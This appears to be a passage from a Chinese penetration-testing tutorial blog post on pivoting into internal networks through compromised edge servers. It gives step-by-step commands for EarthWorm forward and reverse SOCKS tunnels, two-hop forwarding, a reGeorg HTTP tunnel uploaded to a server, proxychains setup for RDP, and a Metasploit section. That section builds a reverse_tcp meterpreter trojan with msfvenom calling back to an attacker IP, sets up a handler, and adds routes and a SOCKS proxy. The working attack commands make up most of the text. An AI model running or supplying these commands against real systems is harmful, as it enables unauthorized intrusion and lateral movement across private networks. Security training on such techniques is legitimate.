<p><a href="https://img.it610.com/image/info8/5ee44acfeb674d07b75b4ecacb58bce7.png"><img src="https://img.it610.com/image/info8/5ee44acfeb674d07b75b4ecacb58bce7.png" alt="" /></a></p>

<p><strong>3.攻击机使用bp的optional添加代理(socks5，ip为边缘服务器ip，8000端口)，之后直接访问目标服务器基本的一些端口都可以访问</strong></p>

<p><a href="https://img.it610.com/image/info8/0865e76b6947444ea0e90bbe3c874e12.jpg"><img src="https://img.it610.com/image/info8/0865e76b6947444ea0e90bbe3c874e12.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第37张图片" /></a><a href="https://img.it610.com/image/info8/1ab022e5499943c1bdb690b3544f5444.png"><img src="https://img.it610.com/image/info8/1ab022e5499943c1bdb690b3544f5444.png" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第38张图片" /></a></p>

<p><strong>4.此时3389仍然不行，可借助proxifier工具配置攻击机整台机器的代理(proxifier添加代理服务器，ip为边缘服务器ip，8000端口)</strong></p>

<p><a href="https://img.it610.com/image/info8/19379e1ee49040209017b2f62f8dbbdd.png"><img src="https://img.it610.com/image/info8/19379e1ee49040209017b2f62f8dbbdd.png" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第39张图片" /></a></p>

<p><strong>5.之后直接访问目标服务器任意端口即可</strong></p>

<p><a href="https://img.it610.com/image/info8/a01f40a32ff84471a90626e52cc52007.jpg"><img src="https://img.it610.com/image/info8/a01f40a32ff84471a90626e52cc52007.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第40张图片" /></a></p>

<p><strong>攻击机为Linux</strong></p>

<p><strong>1.选择合适的ew文件，上传到边缘服务器</strong></p>

<p><strong>2.边缘服务器输入</strong></p>

<pre><code>ew.exe -s ssocksd -l 8000
</code></pre>

<p><a href="https://img.it610.com/image/info8/8032306711974c9fb6fb5b694cd5e0f3.png"><img src="https://img.it610.com/image/info8/8032306711974c9fb6fb5b694cd5e0f3.png" alt="" /></a></p>

<p><strong>3.攻击机火狐浏览器网络设置里的连接设为访问流量走8000端口代理(或者直接bp设置代理)，之后直接访问目标服务器基本的一些端口都可以访问</strong></p>

<p><a href="https://img.it610.com/image/info8/89a918ec1d40476896689018be461d25.jpg"><img src="https://img.it610.com/image/info8/89a918ec1d40476896689018be461d25.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第41张图片" /></a><a href="https://img.it610.com/image/info8/440b5f5288a44ff79ba6b6339b60acba.jpg"><img src="https://img.it610.com/image/info8/440b5f5288a44ff79ba6b6339b60acba.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第42张图片" /></a></p>

<p><strong>4.此时攻击机3389仍然不能访问，可借助proxychains(kali自带)配置攻击机整台机器的代理</strong><br />
4.1 输入gedit /etc/proxychains.conf，按里面的说明进行设置<br />
<a href="https://img.it610.com/image/info8/e19178ad0dd74870874cf4d80737bb1b.jpg"><img src="https://img.it610.com/image/info8/e19178ad0dd74870874cf4d80737bb1b.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第43张图片" /></a><br />
4.2.输入以下命令即可通过代理访问</p>

<pre><code>proxychains 命令(rdesktop 10.1.1.2)
</code></pre>

<p><a href="https://img.it610.com/image/info8/ac747c4bc0514e4fa5b6c55cfbb9de1c.jpg"><img src="https://img.it610.com/image/info8/ac747c4bc0514e4fa5b6c55cfbb9de1c.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第44张图片" /></a></p>

<h3 id="反向代理">反向代理</h3>

<p><strong>1.攻击机运行以下命令，将8888端口转发到1080端口</strong></p>

<pre><code>ew -s rcsocks -l 1080 -e 8888
</code></pre>

<p><a href="https://img.it610.com/image/info8/edde259b45dd4495ba64def35549e232.png"><img src="https://img.it610.com/image/info8/edde259b45dd4495ba64def35549e232.png" alt="" /></a></p>

<p><strong>2.在目标服务器上启动SOCKS v5服务，并反弹到攻击机的8888端口</strong></p>

<pre><code>ew.exe -s rssocks -d 攻击机ip -e 8888
</code></pre>

<p><a href="https://img.it610.com/image/info8/7d14a4ee67c64bf58ad846050c099479.png"><img src="https://img.it610.com/image/info8/7d14a4ee67c64bf58ad846050c099479.png" alt="" /></a></p>

<p><a href="https://img.it610.com/image/info8/54113d39c4cc4399b0de4f68f239ca66.png"><img src="https://img.it610.com/image/info8/54113d39c4cc4399b0de4f68f239ca66.png" alt="" /></a></p>

<p><strong>3.攻击机借助proxifier工具配置攻击机整台机器的代理(proxifier添加代理服务器，ip为攻击机ip，1080端口)</strong></p>

<p><a href="https://img.it610.com/image/info8/bb02493e6de04381988bb230438bb648.png"><img src="https://img.it610.com/image/info8/bb02493e6de04381988bb230438bb648.png" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第45张图片" /></a></p>

<p><strong>4.之后直接访问目标服务器任意端口即可</strong></p>

<p><a href="https://img.it610.com/image/info8/077c8e1acae044a7a3a986d6d1265327.jpg"><img src="https://img.it610.com/image/info8/077c8e1acae044a7a3a986d6d1265327.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第46张图片" /></a></p>

<h3 id="进阶-内网两层边缘服务器">进阶(内网两层边缘服务器)</h3>

<p><strong>情况：</strong></p>

<p>外网与内网存在边界机，内网里分为两个区域，内网区域与dmz区域之间也存在边界机，此时需要两台边界机代理两次</p>

<p><strong>网络配置：</strong></p>

<p>攻击机192.169.0.106，内网边界机1ip：192.168.16.1和10.1.1.1，内网dmz边界机2ip：10.1.1.2和172.1.1.1，dmz区目标服务器ip：172.1.1.2</p>

<p><strong>ew转发(正向)</strong></p>

<p>1.内网dmz边界机2输入命令，开启端口监听</p>

<pre><code>ew -s ssocksd -l 1234
</code></pre>

<p><a href="https://img.it610.com/image/info8/0240ee7f58404f64adc6a71c2089da8d.png"><img src="https://img.it610.com/image/info8/0240ee7f58404f64adc6a71c2089da8d.png" alt="" /></a></p>

<p>2.内网边界机1输入命令，将攻击机的1080端口转发到内网dmz边界机2的1234端口</p>

<pre><code>ew -s lcx_tran -l 1080 -f 内网dmz边界机2ip -g 1234
</code></pre>

<p><a href="https://img.it610.com/image/info8/ef61e0d4441a4e4eb3db0417f6339d6f.png"><img src="https://img.it610.com/image/info8/ef61e0d4441a4e4eb3db0417f6339d6f.png" alt="" /></a></p>

<p>3.攻击机借助proxifier工具配置攻击机整台机器的代理（proxifier添加代理服务器，ip为内网边界机1ip，1080端口）</p>

<p><a href="https://img.it610.com/image/info8/30f62e81befa436e850c5868b9a223b7.png"><img src="https://img.it610.com/image/info8/30f62e81befa436e850c5868b9a223b7.png" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第47张图片" /></a></p>

<p>4.之后直接访问目标服务器任意端口即可</p>

<p><a href="https://img.it610.com/image/info8/36359945eef647e8a55ac6c7dd917632.jpg"><img src="https://img.it610.com/image/info8/36359945eef647e8a55ac6c7dd917632.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第48张图片" /></a></p>

<p><strong>ew转发(反向)</strong></p>

<p>1.攻击机输入命令，开启端口监听</p>

<pre><code>ew -s lcx_listen -l 1080 -e 5678
</code></pre>

<p><a href="https://img.it610.com/image/info8/4c275d7186f3464a92089e6b7e7515c8.png"><img src="https://img.it610.com/image/info8/4c275d7186f3464a92089e6b7e7515c8.png" alt="" /></a></p>

<p>2.内网dmz边界机2输入命令，将2345端口进行转发</p>

<pre><code>ew -s ssocksd -l 2345
</code></pre>

<p><a href="https://img.it610.com/image/info8/230ee18e4a964709a76e78f7857a0d70.png"><img src="https://img.it610.com/image/info8/230ee18e4a964709a76e78f7857a0d70.png" alt="" /></a></p>

<p>3.内网边界机1输入命令，将内网dmz边界机2的2345端口转发到攻击机5678端口</p>

<pre><code>ew -s lcx_slave -d 攻击机ip -e 5678 -f 内网dmz边界机2ip -g 2345
</code></pre>

<p><a href="https://img.it610.com/image/info8/d9f5e033bf7744adbb9cb9189d0128a5.png"><img src="https://img.it610.com/image/info8/d9f5e033bf7744adbb9cb9189d0128a5.png" alt="" /></a></p>

<p><a href="https://img.it610.com/image/info8/445414ee6a7d40909d8f574f0b57080d.png"><img src="https://img.it610.com/image/info8/445414ee6a7d40909d8f574f0b57080d.png" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第49张图片" /></a></p>

<p>4.攻击机借助proxifier工具配置攻击机整台机器的代理（proxifier添加代理服务器，ip为本机ip，1080端口）</p>

<p><a href="https://img.it610.com/image/info8/387823b3fb014a7ca566c6873746ca75.png"><img src="https://img.it610.com/image/info8/387823b3fb014a7ca566c6873746ca75.png" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第50张图片" /></a></p>

<p>5.之后直接访问目标服务器任意端口即可</p>

<p><a href="https://img.it610.com/image/info8/1ea80cf072e449feb6d62ad44a3710d3.jpg"><img src="https://img.it610.com/image/info8/1ea80cf072e449feb6d62ad44a3710d3.jpg" alt="" /></a></p>

<h2 id="工具regeorg-http隧道">工具reGeorg(http隧道)</h2>

<p><strong>1.上传reGeorg里合适的tunnel到边缘服务器</strong></p>

<p><a href="https://img.it610.com/image/info8/faa56c1dbe1e4c3bab517d702405fcf3.jpg"><img src="https://img.it610.com/image/info8/faa56c1dbe1e4c3bab517d702405fcf3.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第51张图片" /></a><br />
<strong>2.攻击机输入命令</strong></p>

<pre><code>python reGeorgSocksProxy.py -u http://192.168.16.129/tunnel.aspx(上传地址)
</code></pre>

<p><a href="https://img.it610.com/image/info8/da569363c8c841249a40cf6d36692059.jpg"><img src="https://img.it610.com/image/info8/da569363c8c841249a40cf6d36692059.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第52张图片" /></a><br />
<strong>3.攻击机输入gedit /etc/proxychains.conf ，按里面的说明进行设置proxychains</strong></p>

<pre><code>socks5 127.0.0.1 8888
</code></pre>

<p><a href="https://img.it610.com/image/info8/44ff002ef20b4be1a87cf345ebfe04d8.png"><img src="https://img.it610.com/image/info8/44ff002ef20b4be1a87cf345ebfe04d8.png" alt="" /></a></p>

<p><strong>4.使用proxychains直接代理连接目标服务器即可</strong></p>

<pre><code>proxychains rdesktop 10.1.1.2（本机ip）
</code></pre>

<p><a href="https://img.it610.com/image/info8/f6cf2552a477452c87cd3cbd74765e1a.jpg"><img src="https://img.it610.com/image/info8/f6cf2552a477452c87cd3cbd74765e1a.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第53张图片" /></a></p>

<h2 id="工具msf">工具msf</h2>

<p><strong>1.选择合适的payload并制作木马，之后将木马上传到边缘服务器</strong></p>

<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.16.130(本机ip) lport=4444 -f exe -o 123.exe
</code></pre>

<p><a href="https://img.it610.com/image/info8/8bf019200ae64fefa5cd1169e8d47b6c.jpg"><img src="https://img.it610.com/image/info8/8bf019200ae64fefa5cd1169e8d47b6c.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第54张图片" /></a></p>

<p><strong>2.攻击机配置监听此payload</strong></p>

<pre><code>use exploit/multi/handler 
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.16.130(本机ip)
exploit
</code></pre>

<p><a href="https://img.it610.com/image/info8/55ab96fb8eba4f728766c3713d041bce.jpg"><img src="https://img.it610.com/image/info8/55ab96fb8eba4f728766c3713d041bce.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第55张图片" /></a></p>

<p><strong>3.运行边缘服务器的木马，攻击机就收到一个meterpreter(sessions)</strong></p>

<p><strong>4.攻击机输入background将此sessions放到后台运行</strong></p>

<p><a href="https://img.it610.com/image/info8/4df8461958cc47a8b979a88b6a9c1e7f.jpg"><img src="https://img.it610.com/image/info8/4df8461958cc47a8b979a88b6a9c1e7f.jpg" alt="" /></a></p>

<p><strong>5.攻击机输入命令，给边缘服务器添加路由</strong></p>

<pre><code>route add 10.1.1.1 255.0.0.0(边缘服务器的内网ip与子网掩码) 1
</code></pre>

<p><img src="https://img.it610.com/image/info8/c46c41cf0d1243798d6e6f9da1a7c28c.jpg" alt="" /></p>

<p><strong>6.利用此路由生成代理端口1080</strong></p>

<pre><code>use auxiliary/server/socks4a 
exploit -y   -y(后台执行)
</code></pre>

<p><a href="https://img.it610.com/image/info8/dae55447853943cb9b66ff4ee09ec5f4.jpg"><img src="https://img.it610.com/image/info8/dae55447853943cb9b66ff4ee09ec5f4.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第56张图片" /></a></p>

<p><a href="https://img.it610.com/image/info8/18955c8ef93e451495243685421791ad.jpg"><img src="https://img.it610.com/image/info8/18955c8ef93e451495243685421791ad.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第57张图片" /></a></p>

<p><strong>7.攻击机输入gedit /etc/proxychains.conf ，按里面的说明进行设置proxychains</strong></p>

<pre><code>socks4 127.0.0.1 1080
</code></pre>

<p><a href="https://img.it610.com/image/info8/ab3a67414c0a4bbbba8b647f3c8f85bd.jpg"><img src="https://img.it610.com/image/info8/ab3a67414c0a4bbbba8b647f3c8f85bd.jpg" alt="" /></a></p>

<p><strong>8.使用proxychains直接代理连接目标服务器即可</strong></p>

<pre><code>proxychains rdesktop 10.1.1.2
</code></pre>

<p><a href="https://img.it610.com/image/info8/0d7181844d3b493684f5de43fea87b24.jpg"><img src="https://img.it610.com/image/info8/0d7181844d3b493684f5de43fea87b24.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第58张图片" /></a></p>

<h1 id="觉得可以的麻烦点个关注">觉得可以的麻烦点个关注</h1>

        </div>

        


        

<div class="post-archive">
    <h2>See Also</h2>
    <ul class="listing">
        
        <li><a href="/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a></li>
        
        <li><a href="/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/">009Shell脚本下条件测试eqne</a></li>
        
        <li><a href="/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/">00Pythonmanagepyshell和Python的分析</a></li>
        
        <li><a href="/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a></li>
        
        <li><a href="/posts/018dockerfileshell/">018DockerfileSHELL</a></li>
        
    </ul>
</div>


        <div class="post-meta meta-tags">
            
            <ul class="clearfix">
                
                <li><a href='https://zaina.newban.cn/tags/shell'>shell</a></li>
                
            </ul>
            
        </div>
    </article>
    
    

    
    
</div>

                    <footer id="footer">
    <div>
        &copy; 2020 <a href="https://zaina.newban.cn">开发者问答集锦 By </a>
        
    </div>
    <br />
    <div>
        <div class="github-badge">
            <a href="https://gohugo.io/" target="_black" rel="nofollow"><span class="badge-subject">Powered by</span><span class="badge-value bg-blue">Hugo</span></a>
        </div>
        <div class="github-badge">
            <a href="https://www.flysnow.org/" target="_black"><span class="badge-subject">Design by</span><span class="badge-value bg-brightgreen">飞雪无情</span></a>
        </div>
        <div class="github-badge">
            <a href="https://github.com/flysnow-org/maupassant-hugo" target="_black"><span class="badge-subject">Theme</span><span class="badge-value bg-yellowgreen">Maupassant</span></a>
        </div>
    </div>
</footer>


    
    <script type="text/javascript">
        window.MathJax = {
            tex2jax: {
                inlineMath: [['$', '$']],
                processEscapes: true
                }
            };
    </script>
    <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>

<a id="rocket" href="#top"></a>
<script type="text/javascript" src='/js/totop.js?v=0.0.0' async=""></script>



    <script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>




                </div>

                <div id="secondary">
    <section class="widget">
        <form id="search" action='https://zaina.newban.cn/search/' method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
      
      <input type="text" name="q" maxlength="20" placeholder="Search">
      <input type="hidden" name="sitesearch" value="https://zaina.newban.cn">
      <button type="submit" class="submit icon-search"></button>
</form>
    </section>
    
    <section class="widget">
        <h3 class="widget-title">最近文章</h3>
<ul class="widget-list">
    
    <li>
        <a href="https://zaina.newban.cn/posts/001rubyruby%E4%B8%AD%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%AE%9E%E4%BE%8B%E5%8F%98%E9%87%8F%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%B1%BB%E5%8F%98%E9%87%8Fsymbol%E5%AF%B9%E6%AF%94/" title="001rubyRuby中全局变量实例变量局部变量类变量Symbol对比">001rubyRuby中全局变量实例变量局部变量类变量Symbol对比</a>
    </li>
    
    <li>
        <a href="https://zaina.newban.cn/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/" title="007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a>
    </li>
    
    <li>
        <a href="https://zaina.newban.cn/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/" title="009Shell脚本下条件测试eqne">009Shell脚本下条件测试eqne</a>
    </li>
    
    <li>
        <a href="https://zaina.newban.cn/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/" title="00Pythonmanagepyshell和Python的分析">00Pythonmanagepyshell和Python的分析</a>
    </li>
    
    <li>
        <a href="https://zaina.newban.cn/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/" title="010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a>
    </li>
    
    <li>
        <a href="https://zaina.newban.cn/posts/018dockerfileshell/" title="018DockerfileSHELL">018DockerfileSHELL</a>
    </li>
    
    <li>
        <a href="https://zaina.newban.cn/posts/01shell%E5%85%A5%E9%97%A801bashshell%E7%89%B9%E6%80%A7/" title="01Shell入门01bashShell特性">01Shell入门01bashShell特性</a>
    </li>
    
    <li>
        <a href="https://zaina.newban.cn/posts/01shell%E5%8F%98%E9%87%8F/" title="01Shell变量">01Shell变量</a>
    </li>
    
    <li>
        <a href="https://zaina.newban.cn/posts/01shell%E5%9F%BA%E7%A1%80%E6%A6%82%E8%BF%B0%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8Fbash%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD/" title="01Shell基础概述脚本执行方式Bash基本功能">01Shell基础概述脚本执行方式Bash基本功能</a>
    </li>
    
    <li>
        <a href="https://zaina.newban.cn/posts/01shell%E7%BC%96%E7%A8%8Bhelloworld/" title="01shell编程helloworld">01shell编程helloworld</a>
    </li>
    
</ul>
    </section>

    

    <section class="widget">
        <h3 class="widget-title"><a href="/categories">分类</a></h3>
<ul class="widget-list">
    
</ul>
    </section>

    <section class="widget">
        <h3 class="widget-title"><a href="/tags">标签</a></h3>
<div class="tagcloud">
    
    <a href="https://zaina.newban.cn/tags/ruby/">ruby</a>
    
    <a href="https://zaina.newban.cn/tags/shell/">shell</a>
    
</div>
    </section>

    

    <section class="widget">
        <h3 class="widget-title">其它</h3>
        <ul class="widget-list">
            <li><a href="https://zaina.newban.cn/index.xml">文章 RSS</a></li>
        </ul>
    </section>
</div>
            </div>
        </div>
    </div>
</body>

</html>